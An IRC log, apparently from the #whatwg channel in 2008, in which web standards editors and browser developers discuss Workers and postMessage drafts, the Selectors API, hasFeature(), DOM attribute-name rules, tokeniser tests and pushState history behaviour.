BTW another way of phrasing those acceptability constraints would be to specify that you want the least solution to the constraints, i.e. the solution that makes the minimum number of workers acceptable

[19:17:00.0000] <Hixie>
true

[19:17:01.0000] <Hixie>
ok, i've tried taking your structure and applied it to the draft

[19:17:02.0000] <Hixie>
http://hixie.ch/specs/dom/workers/0.9

[19:17:03.0000] <roc>
that's quite a popular approach, although sometimes defining "minimal" is itself quite tricky

[19:18:00.0000] <roc>
looks good

[19:18:01.0000] <Hixie>
cool

[19:18:02.0000] <Hixie>
thanks

[19:28:00.0000] <roc>
Hixie: weren't you originally an English major? How much mathematics have you done?

[19:28:01.0000] <Hixie>
physics

[19:28:02.0000] <roc>
ah ok cool

[19:29:00.0000] <roc>
so you probably learned lots of calculus and geometry, which is useless :-)

[19:29:01.0000] <Hixie>
pretty much

[19:29:02.0000] <Hixie>
and all the stats i learnt, which would have been useful, i forgot

[19:30:00.0000] <Hixie>
the scientific method is the main thing i got from my degree which i've applied to the spec work

[03:04:00.0000] <annevk>
passwordsInTheClear-52 lol

[03:06:00.0000] <annevk>
I wonder if I should point out a small mistake or not

[03:12:00.0000] <Lachy>
annevk, what's the mistake?

[03:13:00.0000] <Lachy>
Is this mail basically asking what string can be used for hasFeature() to test for selectors api? http://lists.w3.org/Archives/Public/public-webapi/2008Feb/0035.html

[03:13:01.0000] <annevk>
I think so

[03:13:02.0000] <Lachy>
I don't see a compelling reason to define one

[03:14:00.0000] <annevk>
Me neither

[03:14:01.0000] <hsivonen>
if(document.whateverthenamewas)

[03:14:02.0000] <annevk>
exactly

[03:14:03.0000] <Lachy>
since hasFeature virtually never gets used int he wild and that alternative already works

[03:14:04.0000] <annevk>
and since hasFeature must die

[03:15:00.0000] <Lachy>
:-)

[03:16:00.0000] <gsnedders>
/me stabs hasFeature

[03:19:00.0000] <annevk>
Lachy, as for -52, the second example they give in the HTML section is something the UA can't know and the Web author does and therefore the Web author doesn't use a password field at all and therefore the example is wrong

[03:21:00.0000] <Philip`>
/me wonders how something like target="_blank-but-with-more-security-separation" would work, since JS code will have to determine whether the UA has that feature before deciding to use it (rather than falling back to window.open tricks) and that seems impossible to determine unless there's some API call that returns true when that feature is supported

[03:22:00.0000] <annevk>
the same is true for rel=noreferrer

[03:22:01.0000] <annevk>
oh, maybe rel=noreferrer is the solution?

[03:23:00.0000] <annevk>
/me forgot

[03:24:00.0000] <Lachy>
annevk, I only see 1 HTML example, which appears to be missing the name attribute

[03:24:01.0000] <Lachy>
in section 3

[03:24:02.0000] <Philip`>
I guess in practice people would just use 'if (navigator.userAgent.indexOf('Firefox/4.0.) == -1) { /* use slow ugly fallback mechanism */ }' if they're not given any better way of determining supportedness

[03:25:00.0000] <annevk>
Lachy, the text that provides exceptions in terms of examples to the SHOULD-level requirement is what I was talking about

[03:25:01.0000] <annevk>
Philip`, yeah, transition periods are awkward now and then

[03:27:00.0000] <Philip`>
We're always in a transition period - nothing is going to settle down and stabilise until it's dead

[03:30:00.0000] <annevk>
individual features have shorter transition periods than that though

[03:30:01.0000] <annevk>
I agree that the Web as a whole has a slightly different model :)

[03:37:00.0000] <Philip`>
/me wonders if by 2010 he'll be able to use transparent PNGs without style="-filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(...)"

[03:40:00.0000] <hsivonen>
/me has used transparent PNGs without that kind of stuff since circa 2000

[03:41:00.0000] <Philip`>
/me also needs the transparency to actually be transparent, and needs to work for a sufficiently large proportion of users

[05:04:00.0000] <Lachy>
I just have 3 more issues to resolve in selectors api, and I'm done.

[05:05:00.0000] <annevk>
did you make a simple plain text issues list already?

[05:05:01.0000] <Lachy>
I'm not sure how to deal with these 2 regarding the IDL (see points 2 and 3 in this mail) http://lists.w3.org/Archives/Public/public-webapi/2007Dec/0072.html

[05:05:02.0000] <annevk>
point to DOM Bindings and say that we're going to use that

[05:06:00.0000] <Lachy>
not yet, I've just been tagging the mails in my mail archive.  I will write out a list of issues from that later

[05:06:01.0000] <annevk>
k

[05:06:02.0000] <annevk>
in due course the Web API WG will use http://www.w3.org/TR/DOM-Bindings/ for its deliverables once that reaches a slightly more stable state

[05:07:00.0000] <annevk>
so currently the IDL syntax is more of an informative nature, really

[05:07:01.0000] <Lachy>
the 3rd issue is the one about using XHTML syntax instead of HTML syntax in examples http://lists.w3.org/Archives/Public/public-webapi/2008Jan/0004.html

[05:07:02.0000] <annevk>
and we do plan to fix that before going to PR

[05:07:03.0000] <annevk>
changing examples always introduces bugs is my experience

[05:08:00.0000] <Lachy>
I thought about using DOM Bindings, but wasn't sure, since it's not finished yet

[05:08:01.0000] <Lachy>
I'll check in my current revision now

[05:08:02.0000] <annevk>
we'll do DOM Bindings before CR or PR, whenever DOM Bindings itself is in PR/REC

[05:09:00.0000] <annevk>
(well, that's my idea anyway)

[05:13:00.0000] <Philip`>
When I buy postage stamps, I want them to have the Queen's head on them, not the word "LOVE" in large pink letters :-(

[05:17:00.0000] <takkaria>
I wonder why they have LOVE in large pink letters

[05:20:00.0000] <Lachy>
ann latest version checked in http://dev.w3.org/2006/webapi/selectors-api/

[05:20:01.0000] <Lachy>
s/ann/annevk/

[05:30:00.0000] <Lachy>
/me sends off all responses to the last call comments for selectors api to public-webapi

[05:35:00.0000] <annevk>
I'm not really convinced with the exceptions story, still

[05:35:01.0000] <annevk>
even thoug I added them

[05:35:02.0000] <annevk>
using querySelector to test selector support seems wrong

[05:38:00.0000] <Lachy>
well, send mail about it to public-webapi and see what others think about the idea of removing exceptions

[05:38:01.0000] <annevk>
i remember having done that before

[05:42:00.0000] <Lachy>
you only sent me mail privately

[05:42:01.0000] <Lachy>
I don't recall seeing any discussion about removing exceptions on the mailing list

[05:43:00.0000] <Lachy>
here's that feedback I got from mjs about exceptions http://krijnhoetmer.nl/irc-logs/whatwg/20080208#l-17

[05:48:00.0000] <annevk>
i'm pretty sure it was on the list too and bjoern didn't like it for similar reasons as maciej or something

[05:52:00.0000] <Lachy>
if you did, I can't find it in pubilc-webapi

[07:26:00.0000] <Philip`>
Hmm, Firefox doesn't like setAttribute(':', ...)

[07:27:00.0000] <gavin>
I think jwalden might have a patch for that?

[07:27:01.0000] <gavin>
oh, no, I was thinking of bug 411103

[07:29:00.0000] <Philip`>
/me tries filing https://bugzilla.mozilla.org/show_bug.cgi?id=417491

[07:33:00.0000] <gavin_>
data:text/html,%3Cbody%20:=""%20onload=%22try%20{%20document.body.setAttribute(':',%20'');%20alert('OK')%20}%20catch(e)%20{%20alert(e)%20}%22%3E works, though

[07:33:01.0000] <gavin_>
there's a bug on this already, I think

[07:34:00.0000] <gavin_>
https://bugzilla.mozilla.org/show_bug.cgi?id=390816

[07:35:00.0000] <Philip`>
gavin_: That looks different - ';' should be rejected because it's not a valid XML Name

[07:36:00.0000] <hsivonen>
Philip`: ":" is not a proper XMLNS name, though

[07:37:00.0000] <hsivonen>
(although Gecko has a dual XML 1.0 / XMLNS 1.0 nature in some things, IIRC)

[07:37:01.0000] <Philip`>
hsivonen: DOM just says it should be an XML name - the namespace things only affect setAttributeNS etc

[07:39:00.0000] <gavin_>
hmm

[07:39:01.0000] <Philip`>
/me gives up trying to work out what DOMs can be safely constructed, and just wraps stuff in exception handlers

[07:39:02.0000] <annevk>
i think it makes sense to require XMLNS Name

[07:40:00.0000] <annevk>
so createElement can just become a shorthand for createElementNS(htmlns, name)

[07:41:00.0000] <hsivonen>
/me agrees with annevk

[07:41:01.0000] <gavin_>
/me tries to understand MOZ_XMLCheckQName

[07:41:02.0000] <hsivonen>
on a second though, that won't work for XHR

[07:41:03.0000] <hsivonen>
so, no

[07:42:00.0000] <hsivonen>
since IE XHR is DOM Level 1, stuff like the Flickr API have to be XML 1.0 without XMLNS

[07:42:01.0000] <hsivonen>
yay for XMLNS

[07:43:00.0000] <annevk>
i don't understand

[07:43:01.0000] <annevk>
xhr requires a conforming xmlns parser

[07:44:00.0000] <hsivonen>
IE6 doesn't expose a namespace-aware API for XHR-loaded docs, IIRC

[07:45:00.0000] <hsivonen>
and Safari as shipped with Panther missealized namespaced XML

[07:45:01.0000] <hsivonen>
so RESTful XML APIs that want to be XHR-compatible have to live in the namespaceless XML 1.0 (< 5th ed.) world

[07:45:02.0000] <gavin_>
/me gives up trying to understand, uses a debugger instead

[07:46:00.0000] <hsivonen>
isserialized

[07:46:01.0000] <hsivonen>
misserialized

[07:46:02.0000] <hsivonen>
typo++

[07:46:03.0000] <annevk>
well namespaceless is fine

[07:47:00.0000] <annevk>
i'm just saying that they have to compatible with XMLNS for things to work

[07:48:00.0000] <hsivonen>
sure

[07:48:01.0000] <Philip`>
http://philip.html5.org/tools/parser/?%3C!DOCTYPE%20HTML%3E%0A%3Cx%3Ax%20x%3Ax%3E%3Cx%3A%3Ax%20x%3A%3Ax%3E%3Cx'x%20x'x%3E%3Cfoo%20%3Ax%3E

[07:48:02.0000] <Philip`>
Opera, Firefox and Safari all give different output :-(

[07:48:03.0000] <Philip`>
but at least Opera 9.2 and 9.5 are the same, and Firefox 2 and 3 are the same

[08:12:00.0000] <annevk>
Philip`, heh, cool stuff

[08:17:00.0000] <annevk>
weinig, jwalden (if you read this), any feedback on adding reply() ?

[08:28:00.0000] <aroben>
webben: Aaron's reply is interesting

[08:29:00.0000] <aroben>
annevk: ^^^

[08:29:01.0000] <aroben>
webben: sorry, misdirected that message

[08:30:00.0000] <annevk>
yeah, though then you want a callback for reply() too for longer conversations...

[08:31:00.0000] <annevk>
hmm

[08:33:00.0000] <aroben>
annevk: true

[08:33:01.0000] <aroben>
annevk: you could end up with some very long callback chains on either end

[08:33:02.0000] <aroben>
annevk: (well, I guess both ends, since the chains would have to be within one callback of each other in length)

[08:34:00.0000] <annevk>
yeah, seems icky

[08:35:00.0000] <annevk>
maybe postMessage should return a uuid and that uuid is exposed on the event

[08:35:01.0000] <annevk>
and when you invoke reply it automatically uses the same uuid

[08:36:00.0000] <aroben>
annevk: I guess that would be a little easier than what Gears does

[08:36:01.0000] <aroben>
annevk: since with Gears you have to embed the ID into your message string

[08:36:02.0000] <annevk>
yeah, with postMessage() you'd have to do that too now

[08:37:00.0000] <aroben>
annevk: right

[08:48:00.0000] <annevk>
ok, posted that idea

[08:48:01.0000] <annevk>
i have a feeling that hixie's endpoints stuff does similar tricks, we'll see

[08:49:00.0000] <annevk>
but this proposal is not that more complex than what we have now, so it should be easier to have browsers updated in time with everyone's nearing release dates

[08:49:01.0000] <aroben>
annevk: "endpoints"?

[08:50:00.0000] <annevk>
http://hixie.ch/specs/dom/messages/0.9

[08:50:01.0000] <annevk>
i haven't carefully checked it yet after asking hixie for more rationale

[08:50:02.0000] <aroben>
/me reads

[09:03:00.0000] <aroben>
hm, I think there's a typo in the example on that page

[09:03:01.0000] <aroben>
       gadgetWindow.endPoint.postMessage('get list-of-names', event.endPoint);

[09:03:02.0000] <aroben>
seems like it should just be

[09:04:00.0000] <aroben>
       gadgetWindow.postMessage('get list-of-names', event.endPoint);

[09:05:00.0000] <aroben>
Hixie: ^^^

[10:04:00.0000] <Hixie>
oops. fixed.

[10:36:00.0000] <Philip`>
Ooh, a tokeniser change - how exciting

[10:39:00.0000] <Philip`>
/me updates his four tokeniser implementations

[10:40:00.0000] <Hixie>
hah

[10:41:00.0000] <Hixie>
the graph of time-from-message-being-sent against probability of message being replied that day has a spike at t = 0 days

[10:43:00.0000] <hsivonen>
Hixie: do you have the graph online?

[10:46:00.0000] <Hixie>
P|

[10:46:01.0000] <Hixie>
 |

[10:46:02.0000] <Hixie>
 |_

[10:46:03.0000] <Hixie>
 | |

[10:46:04.0000] <Hixie>
 | |            ____  ?

[10:46:05.0000] <Hixie>
 | |___...---'''

[10:46:06.0000] <Hixie>
 |     

[10:46:07.0000] <Hixie>
-+-------------------->t

[10:47:00.0000] <Hixie>
the start of it -- a few months -- looks like that

[10:47:01.0000] <Hixie>
dunno what the whole thing looks like

[10:47:02.0000] <hsivonen>
Hixie: thanks

[10:52:00.0000] <Philip`>
It's kind of odd how the Ruby html5lib claims to pass all the tokeniser tests, despite it not actually passing

[10:53:00.0000] <Philip`>
Aha, it does "return expected == received" instead of "assert_equal expected, received"

[10:53:01.0000] <hsivonen>
hmm. I wonder what the perf implications of query strings are with the new Access-Control-Policy-Path thing

[10:53:02.0000] <hsivonen>
/me rereads the spec

[10:54:00.0000] <hsivonen>
hmm. looks good

[10:55:00.0000] <hsivonen>
now awaiting for an access-control-enabled browser, then

[10:55:01.0000] <hsivonen>
for validation mashups

[11:07:00.0000] <Philip`>
So, I think the Python and Ruby and OCaml and C++ and JS and Perl tokenisers now match the spec again

[11:09:00.0000] <Philip`>
http://philip.html5.org/tools/parser/?%3C!DOCTYPE%20HTML%20%225%3E2%22%3E%0A...

[11:09:01.0000] <Philip`>
Hmm, that totally doesn't work right in Opera 9.2

[11:17:00.0000] <zcorpan_>
Philip`: you want http://philip.html5.org/tools/parser/?%3C!doctype%20html%20public%20%22%3E%20X

[11:18:00.0000] <Lachy>
heh, I love how things are only bugs if one actually claims conformance :-) http://lists.w3.org/Archives/Public/public-webapi/2008Feb/0071.html

[11:18:01.0000] <hsivonen>
Is RIM a browser vendor these days?

[11:18:02.0000] <Philip`>
zcorpan_: Argh, good point

[11:21:00.0000] <Philip`>
Lachy: I assume that means "claim" in the "returns true from hasFeature" sense, not in the "marketing material has it as a bullet pointed feature"; i.e. it would be alright for someone to have an incomplete/buggy implementation if hasFeature says it's not properly supported and shouldn't be used

[11:21:01.0000] <Philip`>
which seems more reasonable than how I initially read it :-)

[11:22:00.0000] <zcorpan_>
so if hasFeature returns false for everything, the UA is bug-free?

[11:22:01.0000] <Lachy>
zcorpan_, yes.

[11:22:02.0000] <zcorpan_>
awsome

[11:22:03.0000] <Lachy>
/me goes to file a bug for opera about hasFeature returning true for somethings

[11:23:00.0000] <SadEagle>
/me wonders whether there is a feature for hasFeature working...

[11:23:01.0000] <SadEagle>
Core 2.0 or something?

[11:23:02.0000] <SadEagle>
So if hasFeature for that returns false, doens't that mean that other return values are irrelevant? :-)

[11:23:03.0000] <Lachy>
SadEagle, I think it would be covered under the "DOM 2.0" features string (or whatever it is)

[11:24:00.0000] <zcorpan_>
hasFeature("hasFeature", "1.0")

[11:24:01.0000] <zcorpan_>
false

[11:24:02.0000] <zcorpan_>
:)

[11:25:00.0000] <Philip`>
If you return false for hasFeature then you will get the sort-of-gracefully degraded fallback path that authors have conscientiously provided for user agents that don't have the feature, and your users will hate you because they get a degraded experience, and so market forces will compel you to implement the feature perfectly so you can return true from hasFeature

[11:28:00.0000] <Lachy>
everything should just be implemented perfectly in every browser on the first attempt, and then hasFeature can be changed from a method to a single property that just equals true.

[11:30:00.0000] <SadEagle>
Philip`: might be interesting to see how many websites actually use hasFeature

[11:32:00.0000] <Philip`>
http://google.com/codesearch?q=show:mUNqRgxPl_s:oKMDwuYvdP4:CNlRzrngUHA&cs_p=http://www.devlib.org/apache/struts/source/struts-2.0.6-src.zip&cs_f=struts-2.0.6/src/core/src/main/resources/org/apache/struts2/static/dojo/dojo.js.uncompressed.js#l1157

[11:32:01.0000] <Philip`>
There's one

[11:33:00.0000] <Philip`>
http://google.com/codesearch?q=show:BNeIttp5oHc:5g2Z17w4TXQ:BXCuyDas2KE&cs_p=http://openrico.org/svn/openrico/trunk&cs_f=openrico/public/dist/1.1.2/rico.js#l1337

[11:34:00.0000] <Philip`>
http://google.com/codesearch?q=show:UWuK4cTDdZc:A3Gk8FzZWSM:L1InoVp7Omk&cs_p=http://gentoo.osuosl.org/distfiles/Plone-2.1.4.tar.gz&cs_f=Plone-2.1.4/kupu/common/sarissa_ieemu_xpath.js#l26

[11:34:01.0000] <Philip`>
It seems easy to find quite a few

[11:36:00.0000] <SadEagle>
heh, #1 follows it up with a UA sniff.  #2 uses IE-specific path as a fallback, and will fail in konqueror, since it tests for "CSS", "2.0" --- odd thing to test if you want -events- support. #3 actually looks right :-)

[12:32:00.0000] <zcorpan_>
"Making an implementation bug-free is outside the scope of the specification." -- http://www.w3.org/mid/24BE9C481C439C48831EB9E52639B9B60A8D4842⊙Xrn

[12:32:01.0000] <zcorpan_>
hmm, perhaps i have misunderstood the purpose of having specs

[12:34:00.0000] <SadEagle>
it's to say what 'bug-free' means :-)

[12:35:00.0000] <zcorpan_>
i think its time for me to finetune my ignore flag again

[12:36:00.0000] <gsnedders>
I'm bug free.

[12:53:00.0000] <Lachy>
zcorpan_, technically that statement is correct, depending on how you read it. It's the implementor's responsibility to actually write the bug free code, not the specification. But it is the specification's responsibilty to ensure that things are defined well enough to be implemented in bug free ways

[13:42:00.0000] <gsnedders>
RFC3986 doesn't reference RFC2119!

[13:42:01.0000] <gsnedders>
/me is amazed

[13:45:00.0000] <SadEagle>
they don't capitalize SHOULD/MAY/etc.

[13:45:01.0000] <Dashiva>
http://lists.w3.org/Archives/Public/public-webapi/2008Feb/0076.html

[13:45:02.0000] <Dashiva>
what on earth

[13:46:00.0000] <Hixie>
Sent from Yahoo! Mail - a smarter inbox

[13:51:00.0000] <annevk>
Lachy, one other thing to consider btw is to call StaticNodeList NodeList again and mention specifically that DOM Level 3 Core (and maybe previous versions) contains a bug as it calls it a live list where it just defines an interface

[13:52:00.0000] <Hixie>
isn't that what i said at the time :-P

[13:53:00.0000] <annevk>
i was convinced, but some other people were not

[13:53:01.0000] <annevk>
probably easier to get it through now, especially with webkit already doing it that way!

[13:54:00.0000] <annevk>
man, these SMIL people are pushy

[13:55:00.0000] <Hixie>
hm?

[13:56:00.0000] <annevk>
not really

[13:56:01.0000] <annevk>
just getting quite a bit of e-mail about this timesheets draft

[13:57:00.0000] <Hixie>
timesheets?

[13:57:01.0000] <Hixie>
wtf is that

[13:57:02.0000] <gsnedders>
That widely implemented draft, obviously.

[13:58:00.0000] <Lachy>
That would be easier

[13:58:01.0000] <Lachy>
I had assumed that window.DocumentSelector and window.ElementSelector would be exposed, since the interfaces for other DOM2 APIs are exposed

[13:58:02.0000] <jgraham>
/me assumes timesheets is for doing things that were common on 90s era CD-ROMS

[14:00:00.0000] <Lachy>
aargh! What is wrong with Sergey's email client? Why is it putting one word per line?!

[14:00:01.0000] <hsivonen>
one of the spec editors demoed me timesheets

[14:00:02.0000] <annevk>
I think DocumentSelector and ElementSelector should not be exposed on Window

[14:00:03.0000] <hsivonen>
the demoed use case was doing S5 without the JS

[14:00:04.0000] <gsnedders>
/me bravely presses send

[14:00:05.0000] <annevk>
they are redundant

[14:00:06.0000] <annevk>
hopefully DOM Bindings provides a way to say that

[14:01:00.0000] <hsivonen>
I quite liked the Apple CSS animation stuff for transitions and the like

[14:01:01.0000] <annevk>
yeah, we need that

[14:01:02.0000] <SadEagle>
Lachy: are DocumentTraversal, DocumentViews, ElementTarget, DocumentStyle, etc. exposed?

[14:01:03.0000] <hsivonen>
fits what already is there much better than SMIL

[14:01:04.0000] <annevk>
but the $%# CSS WG declared it out of charter

[14:02:00.0000] <jgraham>
I don't claim my assumptions about the purpose of timesheets are at all accurate

[14:02:01.0000] <Lachy>
SadEagle, Firefox exposes DocumentTraversal and DocumentStyle

[14:03:00.0000] <SadEagle>
Odd. But then the entire thing  is a mozillaism everyone else had to emulate, making it a defacto standard :-)

[14:03:01.0000] <annevk>
SadEagle, EventTarget should be exposed, not sure what ElementTarget is

[14:03:02.0000] <SadEagle>
It's a very problematic thing to do, though.

[14:03:03.0000] <annevk>
I agree that exposing DocumentStyle and such makes no sense

[14:03:04.0000] <SadEagle>
annevk: that's what I meant... And I guess EventTarget makes sense, since it can be used as a base class.

[14:03:05.0000] <SadEagle>
Well, what should DocumentStyle.prototype point to?

[14:04:00.0000] <Lachy>
FF exposes EventTarget too. WebKit doesn't seem to expose any of them

[14:04:01.0000] <annevk>
probably maps to Document.prototype

[14:04:02.0000] <annevk>
I don't really like what Firefox does with interfaces at all

[14:04:03.0000] <Lachy>
why not?

[14:05:00.0000] <annevk>
there's now some Web content that relies on XMLDocument and HTMLSpanElement, HTMLUnknownElement and crap like that

[14:05:01.0000] <Lachy>
It makes sense for the ones that define constants, like Node.ELEMENT_NODE

[14:05:02.0000] <annevk>
well, that stuff makes sense

[14:05:03.0000] <annevk>
that stuff is also far more interoperable than what we're discussing here

[14:06:00.0000] <Hixie>
good lord, the html wg is considering even more mailing lists

[14:07:00.0000] <Lachy>
Hixie, what more mailing lists are being considered?

[14:07:01.0000] <Hixie>
see #html-wg

[14:07:02.0000] <SadEagle>
annevk: those are the interfaces they have aren't in the DOM, right?

[14:10:00.0000] <annevk>
yeah

[14:17:00.0000] <Lachy>
/me ponders the idea of adding a hasFeature string to selectors api that implementors are not required to support :-)

[14:18:00.0000] <Dashiva>
hasFeature('Selectors.hasFeature')

[14:19:00.0000] <Hixie>
good to know that the chair of the html working group doesn't read all the mail to the html working group

[14:22:00.0000] <jgraham>
/me doesn't find that too encouraging

[14:23:00.0000] <gsnedders>
/me wonders how many do

[14:23:01.0000] <jgraham>
Chairs of the WG or participants in general?

[14:23:02.0000] <gsnedders>
everyone in the WG

[14:23:03.0000] <annevk>
I skim each e-mail, though I delete some right away based on subject/sender

[14:24:00.0000] <annevk>
(that's not specific to the HTML WG though)

[14:24:01.0000] <Hixie>
i read everything, and save anything that looks useful to the folders for further study later

[14:25:00.0000] <Hixie>
i read public-html (and whatwg, and public-appformats and -webapi) before reading anything from the groups i'm not as actively in, like css or tag or http

[14:25:01.0000] <jgraham>
I ignore anything to do with <abbr> vs <acronym> as a matter of course. And occasionally I never get round to reading some messages.

[14:25:02.0000] <gsnedders>
I skim most things, though there are some things which I know so little about I just ignore from the subject

[14:26:00.0000] <Philip`>
I tend to look at all the words in everything, but I'm not sure if it counts as reading

[14:26:01.0000] <Philip`>
Mostly it's just a way of getting rid of the 'unread messages' marker

[14:27:00.0000] <Hixie>
yeah well some e-mails certainly don't get a very thorough reading

[14:27:01.0000] <Hixie>
especially those written in reply to e-mails that themselves didn't seem to get a thorough reading

[14:27:02.0000] <Hixie>
and i rarely spend more time reading an e-mail than the other person spent writing it

[14:28:00.0000] <Hixie>
(or thinking about it)

[14:28:01.0000] <gsnedders>
Hixie: I guess that means 10 seconds for most of my emails :)

[14:28:02.0000] <gsnedders>
(sadly)

[14:30:00.0000] <Hixie>
:-)

[14:33:00.0000] <annevk>
http://weblogs.mozillazine.org/doron/archives/2008/02/exe_tld_coming_soon.html :o

[14:33:01.0000] <gsnedders>
/me squints

[14:33:02.0000] <SadEagle>
that's not a new issue, though, see .pl :-)

[14:33:03.0000] <gsnedders>
silly Poland, thinking they deserve a TLD!

[14:34:00.0000] <gsnedders>
Or perhaps: Why's that relevant? I mean, who uses perl nowadays?

[14:35:00.0000] <annevk>
SadEagle, heh, true

[14:35:01.0000] <gsnedders>
/me is too tired to be truly witty

[14:35:02.0000] <annevk>
SadEagle, well, actually, .pl is not handled by the browser

[14:35:03.0000] <Hixie>
i'm mildly amused at how the w3c staff (except for mike) aren't actually an active part of the html5 community, despite them making process decision on the htmlwg

[14:36:00.0000] <annevk>
i don't really like it

[14:37:00.0000] <SadEagle>
annevk: it could be though, viewed as text... I am not sure where this distinction matters in mozilla, though (it showed up in KDE, but that was outside a web browser)

[14:38:00.0000] <annevk>
i wonder where browsers do extension sniffing though

[14:38:01.0000] <annevk>
HTML5 contains no such thing!

[14:38:02.0000] <roc>
there's also .au

[14:38:03.0000] <Hixie>
browsers do extension sniffing in the places where html5 explicitly says not to do extension sniffing

[14:39:00.0000] <roc>
there was a famous Gecko bug that only happened on files downloaded from Australia

[14:39:01.0000] <roc>
that took a while to figure out

[14:39:02.0000] <Hixie>
hah

[14:42:00.0000] <gsnedders>
/me waves g'nite

[14:44:00.0000] <Hixie>
'course if .com is no problem, why would .exe be a problem

[14:46:00.0000] <Philip`>
http://eicar.com/download/eicar.com

[14:48:00.0000] <annevk>
Dashiva, you registered?

[15:09:00.0000] <Dashiva>
annevk: Where?

[15:11:00.0000] <annevk>
freenode, nm though, you're on w3.org too :)

[15:39:00.0000] <Hixie>
Philip`: the reason one is a list and one is as stack (despite neither being either) is exactly because it makes them easier to distinguish


2008-02-15
[16:04:00.0000] <Hixie>
since the htmlwg is having a meeting, let's have one too.

[16:04:01.0000] <Hixie>
anyone have any outstanding action items?

[16:04:02.0000] <Hixie>
oh look, we've never assigned any.

[16:04:03.0000] <Hixie>
ok, meeting over.

[16:04:04.0000] <billmason>
Please come run my company's next monthly meeting.

[16:05:00.0000] <Hixie>
my solution to meetings is very simple

[16:05:01.0000] <Hixie>
i refuse to attend any meeting that recurrs

[16:05:02.0000] <Hixie>
i welcome anyone to book me to any meeting they like, but if it recurrs, i won't go.

[16:06:00.0000] <Hixie>
(i also generally refuse action items that i can't do during the meeting)

[16:06:01.0000] <billmason>
I think I'll put that on a t-shirt.  "i refuse to attend any meeting that recurrs"

[16:07:00.0000] <takkaria>
Hixie: a novel approach, but you have to grant a bit of beaurocracy

[16:07:01.0000] <Hixie>
why?

[16:07:02.0000] <Hixie>
we've managed the whatwg pretty well without any

[16:07:03.0000] <jruderman>
billmason: fix the typo first (recurrs -> recurs)

[16:07:04.0000] <Hixie>
i was wondering about that

[16:08:00.0000] <jruderman>
i have 2-3 recurring meetings every week, each about an hour

[16:08:01.0000] <Hixie>
i'm so sorry

[16:08:02.0000] <takkaria>
Hixie: just because the w3 is actually a beaurocracy, and to be a valid one, it needs recurring meetings and action item trackers and all that

[16:08:03.0000] <jruderman>
hehe

[16:09:00.0000] <Hixie>
takkaria: so you're saying i have to allow the w3 to be a valid bureaucracy?

[16:09:01.0000] <Hixie>
i'd rather not :-)

[16:09:02.0000] <takkaria>
I'm not even saying you should go to the meetings

[16:10:00.0000] <takkaria>
I'm just saying that getting html5 the w3c patent review and all that outweighs the silly meetings

[16:11:00.0000] <Hixie>
i agree that the patent policy is a useful thing

[16:11:01.0000] <Hixie>
the jury's still out on whether the cost of working through the w3c outweighs the benefit of the patent policy

[16:12:00.0000] <Lachy>
I have annoying daily project meetings at work, lasting up to half an hour. I hate it

[16:12:01.0000] <Hixie>
DAILY?!

[16:12:02.0000] <Lachy>
yes

[16:12:03.0000] <Hixie>
jeez

[16:13:00.0000] <billmason>
I used to be on a project like that.  It was one of the reasons I got off of it....

[16:14:00.0000] <bewest>
I'm attempting to use html5lib to process a vml document.  vml doesn't support css very well, so if I want to use a common stylesheet to apply styles to both svg and vml documents representing the same thing, I'll need to parse the stylesheet, find all the elements seeming to match any rules, and then translate the properties of applying rules into a dom transformation that will apply the desired styles

[16:15:00.0000] <Hixie>
i have three recuring meetings total, one every two weeks which is pretty much the only time i meet my team mates and find out wtf they're doing, one every week which is the campus-wide beer-and-news-and-questions-for-the-management fest, and one semi-annual (or quarterly? i forget) team week, of which i only attend half.

[16:15:01.0000] <Hixie>
bewest: so you want a css parser?

[16:16:00.0000] <bewest>
yes, among other things

[16:16:01.0000] <bewest>
I think the cssutils python package is probably usable

[16:16:02.0000] <bewest>
I think I need to use the etree builder with html5lib

[16:17:00.0000] <bewest>
when I tried this, etree complains about the doctype before the treebuilder has finished instanciating

[16:17:01.0000] <takkaria>
Hixie: what kind of team are you on?  are you all web standards-related people or is it just a "misc" team?

[16:17:02.0000] <bewest>
(before parsing begins)

[16:18:00.0000] <Hixie>
takkaria: i'm in the open source program office. same team that does google summer of code, googlecode.com, etc

[16:18:01.0000] <takkaria>
ah, I see

[16:18:02.0000] <Hixie>
we're kind of an "odds and ends" team

[16:18:03.0000] <Hixie>
but mostly open-source related

[16:19:00.0000] <bewest>
can anyone suggest alternative strategies I should try to acheive consistent styling across vml and svg?

[16:20:00.0000] <bewest>
does html5lib expect certain versions of etree?

[16:23:00.0000] <bewest>
http://dpaste.com/35244/ is the traceback of http://dpaste.com/35245/

[16:25:00.0000] <bewest>
my understanding is that I should be able to get etree to turn a css selector into an xpath

[16:26:00.0000] <bewest>
hmmm maybe I should check the treebuilder's source for compatibility hints

[16:31:00.0000] <bewest>
Hixie: can you tell your teammates that the svn browser on googlecode breaks the back button?

[16:31:01.0000] <Hixie>
it does?L

[16:32:00.0000] <Hixie>
aaah

[16:32:01.0000] <Hixie>
they changed the interface

[16:32:02.0000] <Hixie>
wtf

[16:33:00.0000] <bewest>
indeed

[16:33:01.0000] <Hixie>
wow yeah, that's annoying

[16:34:00.0000] <bewest>
very

[16:34:01.0000] <bewest>
makes the interface much less efficient

[16:34:02.0000] <Hixie>
seems you can still get to the old interface

[16:35:00.0000] <bewest>
/me doesn't see how

[16:35:01.0000] <Hixie>
go to a file

[16:35:02.0000] <Hixie>
choose "raw view"

[16:35:03.0000] <Hixie>
and then navigate from that uri

[16:35:04.0000] <bewest>
aha

[16:37:00.0000] <Hixie>
apparently it's a known bug

[16:37:01.0000] <bewest>
if it ain't broke... ;-)

[16:38:00.0000] <Hixie>
well, the old ui didn't show revisions

[16:38:01.0000] <bewest>
oh

[16:38:02.0000] <Hixie>
which apparently was a huge issue

[16:38:03.0000] <bewest>
yeah, it's nice to have revisions

[17:46:00.0000] <Hixie>
ps. i hate utf-16

[17:47:00.0000] <Hixie>
/me grumbles at anne for making the utf-16 disease creep into svg

[17:58:00.0000] <Lachy>
Hixie, what's exactly is the UTF-16 disease?

[18:03:00.0000] <roc>
http://weblogs.mozillazine.org/roc/archives/2008/01/string_theory.html

[21:14:00.0000] <Hixie>
/me ponders how to make pushState() work when you cross them when the document isn't active

[21:14:01.0000] <Hixie>
consider something like this:

[21:17:00.0000] <Hixie>
new browsing context, navigate to A. navigate to B. pushState B1, pushState B2. navigate to C.

[21:17:01.0000] <Hixie>
now go back twice, activating B1 and B2 so that the current entry is B1

[21:18:00.0000] <Hixie>
now go back twice again, which puts you on A.

[21:18:01.0000] <Hixie>
now jump to the end, which puts you on C.

[21:18:02.0000] <Hixie>
now go back one.

